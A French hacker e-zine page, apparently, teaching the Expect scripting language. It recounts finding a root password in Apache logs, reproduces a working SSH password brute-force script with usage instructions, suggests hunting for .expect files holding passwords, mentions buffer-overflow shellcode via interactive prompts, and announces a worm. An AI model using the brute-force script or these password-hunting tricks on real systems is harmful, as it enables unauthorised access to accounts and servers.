<html>
<head>
<title>Programmation Expect</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
</head>

<body bgcolor="#000000" text="#9b00ff">
<div align="center">
  <p><b><u><font size="6">Programmation avec Expect</font></u></b></p>
  <p align="left"><font size="2">On se rapproche de notre objectif <img src="../media/rouge_picks.gif" width="35" height="35"></font></p>
  <p align="left"><b>Expect c'est quoi d'abord ?</b><font size="2"><br>
    Expect est avant tout un langage de script bas&eacute; sur Tcl (que vous avez 
    normalement &eacute;tudi&eacute; pr&eacute;c&eacute;demment). Expect est principalement 
    utilis&eacute; pour contr&ocirc;ler et automatiser l'utilisation de programmes 
    int&eacute;ractifs.<br>
    Par int&eacute;ractif je d&eacute;signe tous les programmes qui vont demander, 
    en cours d'ex&eacute;cution, que l'utilisateur tappe au clavier telles ou 
    telles touches, entre telles ou telles commandes.<br>
    En suivant le contenu d'un script, Expect va &ecirc;tre capable de savoir 
    ce que lui demande un programme et ce qu'il doit lui envoyer en r&eacute;ponse.<br>
    Bref le langage Expext permet &agrave; la machine de dialoguer avec un programme 
    comme le ferait une personne au clavier. Expect se charge de lire ce que le 
    programme envoie &agrave; l'&eacute;cran, et envoie une r&eacute;ponse comme 
    venant du clavier. Expect redirige les entr&eacute;es/sorties en quelque sorte. 
    Nous allons &eacute;tudier un exemple dans quelques lignes qui devrait &eacute;claircir 
    les quelques questions qui vous viennent &agrave; l'esprit.</font></p>
  <p align="left"><b>Pourquoi Expect ?</b><font size="2"><br>
    J'ai d&eacute;couvert ce langage tout &agrave; fait au hazard. En fait OS4M4CKERS 
    avait acc&egrave;s &agrave; une b&eacute;cane sur laquelle un syst&egrave;me 
    de gestion des comptes Unix tournait. L&agrave; rien d'anormal. Ce qui &eacute;tait 
    bizarre &eacute;tait que ce syst&egrave;me &eacute;tait sous la forme d'une 
    interface web.<br>
    Sur le site en question on trouvait un formulaire qui permettait aux utilisateurs 
    de modifier le pass de leur compte et aussi un formulaire admin pour modifier 
    les pass des utilisateurs. Les formulaires en question appelait des scripts 
    en perl pour traiter les infos.<br>
    Comme on avait les droits sur les CGI &ccedil;a n'a pas &eacute;t&eacute; 
    difficile de voir comment ce syst&egrave;me fonctionnait. Le script CGI faisait 
    &agrave; la commande suivante :<br>
    <font color="#00FFFF">'/usr/bin/expect&nbsp;&nbsp; update.expect&nbsp;&nbsp; 
    $user&nbsp;&nbsp; $pasuser1&nbsp;&nbsp; $pasmanag'</font></font></p>
  <p align="left"><font size="2">Aussit&ocirc;t on regarde ce qui se trouve dans 
    ce fichier :<br>
    <font color="#FF9900">#</font><font color="#FFFFFF">!/usr/bin/expect<br>
    <b>puts</b><font color="#00FFFF"> &quot;Content-type: text/html&quot;</font><br>
    <b>se</b>t usernd [<b>lindex</b> $argv 0]<br>
    <b>set</b> pasus1 [<b>lindex</b> $argv 1]<br>
    <b>set</b> pasman [lindex $argv 2]<br>
    <b>spawn</b> -noecho /bin/su root -c<font color="#00FFFF"> &quot;/usr/bin/passwd 
    $usernd &gt; /dev/null&quot;</font><br>
    <b>expect</b> <font color="#00FFFF">&quot;Password:&quot;</font><br>
    <b>send</b> <font color="#00FFFF">&quot;$pasman\r&quot;</font><br>
    <b>expect</b> <font color="#00FFFF">&quot;New password:&quot;</font><br>
    <b>send</b> <font color="#00FFFF">&quot;$pasus1\r&quot;</font><br>
    <b>expect</b> <font color="#00FFFF">&quot;Re-enter new password:&quot;</font><br>
    <b>send</b> <font color="#00FFFF">&quot;$pasus1\r&quot;</font><br>
    <b>expect</b> eof</font></font></p>
  <p align="left"><font size="2">Les premi&egrave;res commandes sont du Tcl. Le 
    script r&eacute;cup&egrave;re le login de l'utilisateur, son pass et aussi 
    le pass du root qui sont pass&eacute;s en arguments. Le tout est stock&eacute; 
    dans diff&eacute;rentes variables.<br>
    Ensuite le script <font color="#00FFFF">&quot;spawn&quot;</font> la commande 
    su. spawn permet de lancer un programme externe et en m&ecirc;me temps redirige 
    les entr&eacute;es sorties sur notre script.<br>
    Dans notre cas on remarque que la commande su est appel&eacute;e de fa&ccedil;on 
    &agrave; devenir root et &agrave; ex&eacute;cuter une seule commande : la 
    commande passwd qui permettra de changer le pass de l'utilisateur choisi.<br>
    Le script s'attend ensuite &agrave; ce que la commande su lui envoie la cha&icirc;ne 
    de caract&egrave;res <font color="#00FFFF">&quot;Password:&quot;</font> qui 
    demande la pass du root (commende expect).<br>
    Ce mot de passe est envoy&eacute; par la commande send.<br>
    Comme pr&eacute;vu la commande passwd est alors lanc&eacute;e. Le script attend 
    la cha&icirc;ne <font color="#00FFFF">&quot;New password:&quot;</font>. Quand 
    il l'a, il envoie le nouveau mot de passe une premi&egrave;re fois.<br>
    passwd r&eacute;pond par<font color="#00FFFF"> &quot;Re-enter new password:&quot;</font>. 
    Le script renvoie donc le pass une nouvelle fois et attend que le programme 
    passwd s'arr&ecirc;te.<br>
    Vous avez compris ? Le script expect a dialogu&eacute; &agrave; un programme 
    et ce sans notre intervention :)</font></p>
  <p align="left"><font size="2">Pour la petite histoire il nous a suffit de regarder 
    dans les logs Apache pour trouver le pass du root (le script &eacute;tait 
    appel&eacute; sous la forme fichier.cgi?pasman=****)</font></p>
  <p align="left"><b>Des exemples !! On veut des exemples !!</b><font size="2"><br>
    Apr&egrave;s quelques recherches sur Expect j'ai trouv&eacute; quelques applications 
    et comme j'avais toujours eu envie de faire un ver je me suis dit que je le 
    ferais pour le mag et en Expect.<br>
    Un des classiques en ce qui concerne l'utilisation d'Expect est l'appel &agrave; 
    la commande 'su' comme vu pr&eacute;c&eacute;demment. C'est chiant de toujours 
    avoir &agrave; tapper le mot de passe quand on passe en root pour installer 
    un soft etc. Avec un script de quelques lignes on peut automatiser cette tache 
    :<br>
    <font color="#FF9900">#</font><font color="#FFFFFF">!/usr/bin/expect<br>
    <b>spawn</b> su<br>
    <b>expect</b> <font color="#00FFFF">&quot;assword:&quot;</font><br>
    <b>send</b> <font color="#00FFFF">&quot;mon_pass\n&quot;</font><br>
    <b>interact</b></font></font></p>
  <p align="left"><font size="2">Premi&egrave;re question : pourquoi j'ai mis<font color="#00FFFF"> 
    'assword:'</font> et pas<font color="#00FFFF"> 'Password:'</font> ? Parce 
    que cela permet une meilleure compatibilit&eacute; entre les diff&eacute;rentes 
    plates formes. Par exemple sous un syst&egrave;me le mot password prendra 
    un P majuscule et sous un autre syst&egrave;me une minuscule etc.<br>
    Pour la commande send, il faut aussi mettre un \n pour simuler l'appui sur 
    la touche entr&eacute;e.<br>
    Pour terminer le interact permet de redonner la main &agrave; l'utilisateur.<br>
    Comme cela, la prochaine fois que vous voulez devenir root il vous suffit 
    d'appeler le script expect et la commande su s'ex&eacute;cute comme par magie 
    :)<br>
    Le danger d'une telle pratique est simple &agrave; voir : il ne faut pas que 
    quelqu'un d'autre que vous puisse lire ce script qui contient le pass du root.<br>
    Les scripts expect n'ont pas d'extension bien d&eacute;finies mais l'extension 
    '.expect' revient couremment donc rechercher de tels fichers peut &ecirc;tre 
    une possibilit&eacute; d'attaque ;)</font></p>
  <p align="left"><font size="2">Attention !! Ne m&eacute;langez pas le langage 
    Expect avec la commande expect qui fait partie du langage. Je ne fais pas 
    de distinctions quand je l'&eacute;crit mais je pense que plac&eacute; dans 
    un contexte pr&eacute;cis vous saurez si je parle du langage ou de la commande.</font></p>
  <p align="left"><font size="2">Etudions maitenant un brute-force ssh que j'ai 
    trouv&eacute; sur hack.co.za :<br>
    <font color="#FF9900">#</font><font color="#FFFFFF">!/usr/bin/expect -f<br>
    <font color="#FF9900"># by John Lampe<br>
    # dorky way to brute force ssh passwd<br>
    # from command prompt do a<br>
    # for i in `cat PASSWD_FILE`; do ./ssh_brute.expect $i IPADDRESS &gt;&gt; 
    ssh_rezults; done<br>
    # where PASSWD_FILE is your dictionary file and IPADDRESS is (duh) the IP 
    address<br>
    # then run<br>
    # grep &quot;SNAGGED&quot; ssh_rezults</font><br>
    <br>
    <b>set</b> timeout 5 ;<font color="#FF9900"> #On fine le timeout &agrave; 
    5 secondes</font><br>
    <br>
    <b>set</b> passwd [<b>lindex</b> $argv 0]; <font color="#FF9900">#Le password 
    est le premier argument</font><br>
    <b>set</b> host [<b>lindex</b> $argv 1] ;<font color="#FF9900">#IP du serveur 
    est le second argument</font><br>
    <br>
    <b>spawn</b> ssh $host ;<font color="#FF9900"> #On lance ssh</font><br>
    <br>
    <b>expect</b> <font color="#00FFFF">&quot;password:&quot;</font><br>
    <b>send</b> -- <font color="#00FFFF">&quot;$passwd\n&quot;</font>;<font color="#FF9900"># 
    Les deux tirets &agrave; la suite permettent de signaler le fin des arguments 
    (pas n&eacute;cessaire ici) </font><br>
    <br>
    <b>expect</b> {;<font color="#FF9900">#expect peut fonctionner sous la forme 
    d'un switch<br>
    </font><br>
    <font color="#00FFFF">&quot;assword&quot;</font> {<b> exit</b> 0 } ;<font color="#FF9900">#On 
    a visiblement r&eacute;cup&eacute;r&eacute; un 'Password invalid' ou 'Invalid 
    password' etc. </font><br>
    <font color="#00FFFF">&quot;enied</font>&quot; { <b>exit</b> 0 }; <font color="#FF9900">#Access 
    Denied</font><br>
    <font color="#00FFFF">&quot;#&quot;</font> { <b>send_user</b> &quot;SNAGGED 
    $passwd\n&quot; };<font color="#FF9900">#Cool un shell !! On envoie le pass 
    sur la sortie standard (pas sur l'entr&eacute;e de ssh)</font><br>
    timeout {<b> exit</b> 254 } ;<font color="#FF9900"># Si 5 secondes se sont 
    &eacute;coul&eacute;es sans aucune r&eacute;ponse c'est qu'il y a un probl&egrave;me 
    ==&gt; on quitte</font><br>
    eof { <b>exit</b> 253 };<font color="#FF9900">#La connexion a &eacute;t&eacute; 
    ferm&eacute;e par le serveur</font><br>
    <br>
    }<br>
    <br>
    <b>exit</b> 0; <font color="#FF9900">#On quitte</font></font></font></p>
  <p align="left"><font size="2">Sympa ce script non ? Toutefois je ne vous conseille 
    pas de l'utiliser car il ne fait qu'appeler le programme ssh. Si vous voulez 
    vraiment bruteforcer un ssh prenez un prog en C qui sera bien plus rapide.<br>
    Un autre classique des scripts expect c'est la connexion &agrave; un ftp. 
    Imaginons que vous &ecirc;tes l'admin du soci&eacute;t&eacute; d&eacute;test&eacute; 
    par les hackers (style Microsoft, Verysign...) Vous avez des tentatives d'intrusion 
    toutes les deux minutes. Vous vous retenez de pisser tellement vous avez peur 
    que le temps d'aller au toilettes votre pauvre serveur soit d&eacute;fac&eacute;.<br>
    Cher Monsieur, j'ai la solution &agrave; tous vos probl&egrave;mes !! Avec 
    le script Expect suivant vous ne serez m&ecirc;me plus oblig&eacute; d'aller 
    au bureau et de vivre dans la parano&iuml;a.<br>
    <font color="#FFFFFF"><b>spawn</b> /bin/ftp $HOST<br>
    <b>set</b> timeout &nbsp;-1;<font color="#FF9900">#Timeout infini</font>. 
    <font color="#FF9900">Par d&eacute;faut le timeout est de 10 secondes</font> 
    <br>
    <b>expect</b> <font color="#00FFFF">&quot;ame&quot;</font> {<b>send</b> <font color="#00FFFF">&quot;$USER\n&quot;</font>}<br>
    <b>expect</b> <font color="#00FFFF">&quot;assword:&quot;</font> {<b>send</b> 
    <font color="#00FFFF">&quot;$PASSWORD\n&quot;</font>}<br>
    <b>expect</b> {<br>
    &nbsp;&nbsp;&nbsp;<font color="#00FFFF">&quot;incorrect&quot;</font> {<b>puts</b> 
    <font color="#00FFFF">&quot;Bad Password\n&quot;</font>;<b>exit</b>}<br>
    &nbsp;&nbsp;&nbsp;<font color="#00FFFF">&quot;ftp&gt;&quot;</font> {<b>send</b> 
    <font color="#00FFFF">&quot;cd public_html\n&quot;</font>}<br>
    }<br>
    <b>expect</b><font color="#00FFFF"> &quot;ftp&gt;&quot;</font> {<b>send</b> 
    <font color="#00FFFF">&quot;bin\n&quot;</font>}<br>
    <b>expect</b> <font color="#00FFFF">&quot;ftp&gt;&quot;</font> {<b>send</b> 
    <font color="#00FFFF">&quot;put $FILE\n&quot;</font>}<br>
    <b>expect</b><font color="#00FFFF"> &quot;ftp&gt;&quot;</font> {<b>send</b> 
    <font color="#00FFFF">&quot;quit\n&quot;</font>}<br>
    <b>expect</b> <font color="#00FFFF">&quot;Goodbye&quot;</font><br>
    <b>send_user</b> <font color="#00FFFF">&quot;File sent.\n&quot;</font></font></font></p>
  <p align="left"><font size="2">Evidemment les variables doivent &ecirc;tre fix&eacute;es 
    auparavant. En mettant ce script dans les taches plannifi&eacute;es pour que 
    le script soit appel&eacute; toutes les 5 minutes, le fichier sur le serveur 
    ne sera jamais corrompu longtemps :) En m&ecirc;me temps our uploader la page 
    d'index toutes les 5 minutes faut vraiment &ecirc;tre parano !!</font></p>
  <p align="left"><font size="2">Ce script est loin d'&ecirc;tre &eacute;volu&eacute;. 
    On aurrait par exemple pu faire des expect sur les codes de r&eacute;ussite 
    ou d'&eacute;chec du protocole FTP (530 = Login Incorect par exemple).<br>
    Si on faisait un peu de Telnet maintenant :<br>
    <font color="#FF9900">#</font><font color="#FFFFFF">!/usr/bin/expect -f<br>
    <b>set</b> timeout 5<br>
    <b>log_user</b>&nbsp;&nbsp; 0 ;<font color="#FF9900"># A ce que j'ai compris 
    &ccedil;a emp&egrave;che d'afficher &agrave; l'&eacute;cran le dialogue du 
    script avec le telnet</font><br>
    <br>
    <b>gets</b> stdin name;<font color="#FF9900">#L'utilisateur doit tapper le 
    login &amp; le pass</font><br>
    <b>gets</b> stdin pw<br>
    <br>
    <b>spawn</b>&nbsp;&nbsp; <font color="#00FFFF">&quot;/usr/bin/telnet&quot;&nbsp;&nbsp; 
    &quot;localhost&quot;</font></font></font><font size="2" color="#00FFFF"> 
    </font><font size="2" color="#FFFFFF"><br>
    <b>expect</b> {<br>
    &nbsp;&nbsp;&nbsp;-- <font color="#00FFFF">&quot;ogin: $&quot;</font> { <b>send</b> 
    -- <font color="#00FFFF">&quot;$name\r&quot;</font> }<br>
    &nbsp;&nbsp;&nbsp;timeout { <b>send</b> -- <font color="#00FFFF">&quot;\r\r&quot;</font> 
    }<br>
    &nbsp;&nbsp;&nbsp;eof { <b>exit</b> 253 }<br>
    }<br>
    <br>
    <b>expect</b> {<br>
    &nbsp;&nbsp;&nbsp;<font color="#00FFFF">&quot;ssword: $&quot;</font> { <b>send</b> 
    -- <font color="#00FFFF">&quot;$pw\r&quot;</font> }<br>
    }<br>
    <br>
    <b>expect</b> {<br>
    &nbsp;&nbsp;&nbsp;<font color="#00FFFF">&quot;ast login:&quot;</font> {<i> 
    commandes &agrave; faire</i>}<br>
    &nbsp;&nbsp;&nbsp;<font color="#00FFFF">&quot;(\\\$|%)&quot;</font> { <i>commandes 
    &agrave; faire</i> }<br>
    &nbsp;&nbsp;&nbsp;<font color="#00FFFF">&quot;ogin incorrect&quot;</font> 
    { <b>exit</b> 1 }<br>
    &nbsp;&nbsp;&nbsp;timeout {<b> exit</b> 254 }<br>
    &nbsp;&nbsp;&nbsp;eof { <b>exit</b> 253 }<br>
    }</font></p>
  <p align="left"><font size="2">C'est un des plus beaux scripts expect que j'ai 
    trouv&eacute; pour telnet <img src="../media/rasta.gif" width="43" height="23"><br>
    C'est pas un brute force : c un script qui permet d'automatiser un travail 
    &agrave; faire sur une machine distante.</font></p>
  <p align="left"><font size="2">Un dernier point que je voulais aborder : les 
    buffers overflows. On trouve beaucoup d'exploits pour des applications distantes 
    (communication par socket) ou pour des applis locales.<br>
    Mais la plupart des failles exploit&eacute;s en local sont des overflows dans 
    des variables d'environnement, dans les param&ecirc;tres d'appel du programme 
    vuln&eacute;rable...<br>
    Bref pas d'exploits pour les programmes interractifs pourtant les failles 
    existent !!!<br>
    Le langage Expect et ses outils permettent de telles exploitations. J'ai essay&eacute; 
    avec un programme qui fait un simple scanf() en plein milieu de son ex&eacute;cution. 
    En envoyant le shellcode &amp; co au moment du scanf() j'ai r&eacute;ussi 
    &agrave; r&eacute;cup&eacute;rer un shell :-)<br>
    J'esp&egrave;re que l'on verra des exploits en expect sous peu ;-p</font></p>
  <p align="left"><font size="2">Pour de plus amples infos sur expect : man expect.<br>
    Il y a tr&egrave;s peu de doc sur Expect en dehors de la page de manuel. On 
    peut trouver pas mal de scripts sur le net mais ils se ressemblent tous :-(<br>
    Toutefois il existe UN forum Tcl/Expect en Anglais o&ugrave; les mecs ont 
    l'air assez cal&eacute; : <a href="http://www.wellho.net/cgi-bin/opentalk/YaBB.pl?board=tcl">http://www.wellho.net/cgi-bin/opentalk/YaBB.pl?board=tcl</a>.</font></p>
  <p align="left"><font size="2">Prochaine &eacute;tape : la programmation de 
    notre ver.</font></p>
  </div>
</body>
</html>
